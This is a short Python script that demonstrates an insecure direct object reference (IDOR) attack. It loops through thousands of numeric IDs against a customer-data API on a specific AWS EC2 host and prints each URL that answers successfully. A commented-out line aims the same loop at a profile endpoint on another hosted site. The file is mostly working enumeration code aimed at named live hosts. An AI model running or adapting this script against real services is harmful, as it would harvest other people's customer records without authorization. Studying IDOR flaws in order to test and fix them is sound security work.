#INSECURE DIRECT OBJECT REFERENCE
#An attack which any application uses user supply information to access objects/data directly without validating
import requests 
for i in range(1 , 5000):
    #print(i)
    #URL = f"https://networking-ecommerce-new.onrender.com/profile?id={i}"
    URL = f"http://ec2-3-108-196-161.ap-south-1.compute.amazonaws.com/api/get-customer?id={i}"
    response = requests.get(url = URL)
    if response.status_code == 200:
        print(URL)